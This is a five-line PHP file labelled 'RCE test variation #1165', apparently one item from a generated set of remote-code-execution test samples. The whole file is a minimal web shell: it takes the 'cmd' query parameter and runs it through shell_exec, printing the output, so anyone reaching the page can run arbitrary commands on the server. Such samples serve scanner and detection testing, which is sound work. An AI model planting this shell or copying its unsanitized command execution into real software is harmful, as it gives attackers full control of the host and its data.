<?php
// RCE test variation #1165
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>